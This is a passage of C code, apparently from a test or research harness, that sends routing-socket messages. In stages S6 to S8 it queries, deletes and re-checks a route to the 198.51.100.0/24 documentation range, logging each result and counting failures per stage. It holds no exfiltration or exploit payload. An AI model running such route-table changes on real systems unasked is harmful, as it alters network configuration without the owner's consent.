                    q->sin_addr.s_addr = htonl(0xc6336400u);
                    rtm->rtm_msglen = (uint16_t)(off + q->sin_len);
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_GET;
                    rtm->rtm_addrs = AGX_RTA_DST;
                    rtm->rtm_seq = 6;

                    errno = 0;
                    s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S6 GET 198.51.100.0 -> %zd errno=%d", s, errno);
                    got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S6 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S6", rb, got); rtp_hdr("S6", rb, got); rtp_sas("S6", rb, got); }
                    else stages[6]++;

                    /* --- S7: RTM_DELETE it again --- */
                    memset(msg, 0, sizeof(msg));
                    rtm = (struct agx_rt_msghdr *)msg;
                    off = sizeof(*rtm);
                    struct sockaddr_in *dd = (struct sockaddr_in *)(msg + off);
                    dd->sin_len = sizeof(*dd); dd->sin_family = AF_INET;
                    dd->sin_addr.s_addr = htonl(0xc6336400u);
                    off += (dd->sin_len + 3) & ~(size_t)3;
                    struct sockaddr_in *dm = (struct sockaddr_in *)(msg + off);
                    dm->sin_len = sizeof(*dm); dm->sin_family = AF_INET;
                    dm->sin_addr.s_addr = htonl(0xffffff00u);
                    off += (dm->sin_len + 3) & ~(size_t)3;
                    rtm->rtm_msglen = (uint16_t)off;
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_DELETE;
                    rtm->rtm_flags = AGX_RTF_UP | AGX_RTF_GATEWAY;
                    rtm->rtm_addrs = AGX_RTA_DST | AGX_RTA_NETMASK;
                    rtm->rtm_seq = 7;

                    errno = 0;
                    s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S7 RTM_DELETE 198.51.100.0/24 msglen=%u -> %zd errno=%d",
                            (unsigned)rtm->rtm_msglen, s, errno);
                    got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S7 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S7", rb, got); rtp_hdr("S7", rb, got); }
                    else stages[7]++;

                    /* --- S8: confirm the route is gone --- */
                    memset(msg, 0, sizeof(msg));
                    rtm = (struct agx_rt_msghdr *)msg;
                    off = sizeof(*rtm);
                    struct sockaddr_in *qq = (struct sockaddr_in *)(msg + off);
                    qq->sin_len = sizeof(*qq); qq->sin_family = AF_INET;
                    qq->sin_addr.s_addr = htonl(0xc6336400u);
                    rtm->rtm_msglen = (uint16_t)(off + qq->sin_len);
                    rtm->rtm_version = AGX_RTM_VERSION;
                    rtm->rtm_type = AGX_RTM_GET;
                    rtm->rtm_addrs = AGX_RTA_DST;
                    rtm->rtm_seq = 8;

                    errno = 0;
                    s = send(fd, msg, rtm->rtm_msglen, 0);
                    rtp_log("[*] routesock S8 GET 198.51.100.0 after delete -> %zd errno=%d", s, errno);
                    got = rtp_read(fd, rb, sizeof(rb), 1200);
                    rtp_log("[*] routesock S8 reply -> %d bytes", got);
                    if (got > 0) { rtp_dump("S8", rb, got); rtp_hdr("S8", rb, got); rtp_sas("S8", rb, got); }
                    else stages[8]++;
                }
                close(fd);
                rtp_log("[*] routesock done: stages(failures) = %d %d %d %d %d %d %d %d %d, first_err=%d",
                        stages[0], stages[1], stages[2], stages[3], stages[4], stages[5],
                        stages[6], stages[7], stages[8], first_err);
                return first_err;
            }
